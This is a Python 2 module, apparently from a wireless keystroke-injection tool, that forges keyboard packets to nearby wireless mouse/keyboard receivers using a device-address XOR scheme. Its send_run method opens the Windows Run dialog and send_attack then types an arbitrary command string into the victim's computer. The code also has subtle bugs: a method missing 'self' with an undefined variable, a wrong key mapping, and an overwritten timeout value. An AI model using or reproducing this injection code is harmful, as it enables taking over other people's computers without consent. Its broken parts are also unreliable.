#!/usr/bin/env python

import logging, time

class mouse:

  hid_map = {
    0x04:  ['a','A'],
    0x05:  ['b','B'],
    0x06:  ['c','C'],
    0x07:  ['d','D'],
    0x08:  ['e','E'],
    0x09:  ['f','F'],
    0x0A:  ['g','G'],
    0x0B:  ['h','H'],
    0x0C:  ['i','I'],
    0x0D:  ['j','J'],
    0x0E:  ['k','K'],
    0x0F:  ['l','L'],
    0x10:  ['m','M'],
    0x11:  ['n','N'],
    0x12:  ['o','O'],
    0x13:  ['p','P'],
    0x14:  ['q','Q'],
    0x15:  ['r','R'],
    0x16:  ['s','S'],
    0x17:  ['t','T'],
    0x18:  ['u','U'],
    0x19:  ['v','V'],
    0x1A:  ['w','W'],
    0x1B:  ['x','X'],
    0x1C:  ['y','Y'],
    0x1D:  ['z','Z'],
    0x1E:  ['1','!'],
    0x1F:  ['2','@'],
    0x20:  ['3','#'],
    0x21:  ['4','$'],
    0x22:  ['5','%'],
    0x23:  ['6','^'],
    0x24:  ['7','&'],
    0x25:  ['8','*'],
    0x26:  ['9','('],
    0x27:  ['0',')'],
    0x28:  ['\n','\n'],
    0x29:  ['[ESC]', '[ESC]'],
    0x2A:  ['[BKSP]', '[BKSP]'],
    0x2B:  ['\t','\t'],
    0x2C:  [' ',' '],
    0x2D:  ['-','_'],
    0x2E:  ['=','+'],
    0x2F:  ['[','{'],
    0x30:  ['}','}'],
    0x31:  ['\\','|'],
    0x32:  ['#','-'],
    0x33:  [';',':'],
    0x34:  ['\'','"'],
    0x35:  ['`','~'],
    0x36:  [',','<'],
    0x37:  ['.','>'],
    0x38:  ['/','?'],
    0x39:  ['[CAPS]', '[CAPS]'],
    0x3A:  ['[F1]', '[F1]'],
    0x3B:  ['[F2]', '[F2]'],
    0x3C:  ['[F3]', '[F3]'],
    0x3D:  ['[F4]', '[F4]'],
    0x3E:  ['[F5]', '[F5]'],
    0x3F:  ['[F6]', '[F6]'],
    0x40:  ['[F7]', '[F7]'],
    0x41:  ['[F8]', '[F8]'],
    0x42:  ['[F9]', '[F9]'],
    0x43:  ['[F10]', '[F10]'],
    0x44:  ['[F11]', '[F11]'],
    0x45:  ['[F12]', '[F12]'],
    0x46:  ['[PrintScr]', '[PrintScr]']
    # ...etc. There are more on http://www.freebsddiary.org/APC/usb_hid_usages.php
  }

  def __init__(self, radio, address, ack_timeout=250, retries=1):
    self.radio = radio
    self.address = address
    self.string_address = ':'.join('{:02X}'.format(b) for b in address)
    self.raw_address = self.string_address.replace(':', '').decode('hex')[::-1][:5]
    self.payload = [0] * 19
    self.channels = range(2, 84)
    self.pingable = True

    # Format the ACK timeout and auto retry values
    self.ack_timeout = int(ack_timeout / 250) - 1
    self.ack_timeout = max(0, min(ack_timeout, 15))
    self.retries = max(0, min(retries, 15))

  def decrypt(self, pay):
    p = pay[:]
    for i in range(4, len(p)):
      p[i] ^= ord(self.raw_address[(i - 4) % 5])
    return p

  def serialize(self, p):
    return str(bytearray(self.decrypt(p)))

  def hid_decode(hid, meta):
    if key in self.hid_map:
      shift = 0
      if meta & 0x22:
        shift = 1
      return self.hid_map[key][shift]
    else:
      return ''

  def checksum(self):
    self.payload[-1] = 0
    for i in range(0, len(self.payload) - 1):
      self.payload[-1] ^= self.payload[i]
    self.payload[-1] = ~self.payload[-1] & 0xff

  def inc_sequence(self):
    if self.payload[4] == 255:
      self.payload[5] += 1
      self.payload[4] = 0
    else:
      self.payload[4] += 1

  def set_key(self, key):
    # device type = keyboard
    self.payload[6] = 67
    self.payload[17] = 0

    if key == '':
      self.payload[7] = 0
      self.payload[9] = 0
      return

    for k, v in self.hid_map.iteritems():
      if v[0] == key:
        # clear special keys
        self.payload[7] = 0
        self.payload[9] = k
        return
      elif v[1] == key:
        # hold shift
        self.payload[7] = 2
        self.payload[9] = k
        return

  def transmit(self, c=''):
    self.set_key(c)
    self.inc_sequence()
    self.checksum()
    self.radio.transmit_payload(self.serialize(self.payload), self.ack_timeout, self.retries)

  def send_attack(self, attack):
    for _ in range(3):
      self.transmit()

    self.send_run()
    for c in attack:
      self.transmit(c)
      time.sleep(0.01)
      self.transmit()
      time.sleep(0.02)

  def send_run(self):
    self.payload[6] = 67
    self.payload[17] = 0
    self.payload[7] = 0x08
    self.payload[9] = 0x15

    self.inc_sequence()
    self.checksum()
    self.radio.transmit_payload(self.serialize(self.payload), self.ack_timeout, self.retries)
    self.transmit()
    
    time.sleep(0.2)

  def update(self, payload):
    if len(payload) == 19 and payload[1] == 0x90:
      if (payload[0] == 0x08 or payload[0] == 0x0c) and payload[6] == 0x40:
        self.payload = payload.tolist()
        self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.channels = [21, 23, 25, 46, 50, 56, 60, 72, 74, 78]
        self.pingable = False
      elif payload[0] == 0x0a:
        p = self.decrypt(payload)
        if p[6] == 0x40:
          self.payload = p.tolist()
          self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
          self.channels = range(2, 84)
          self.pingable = True


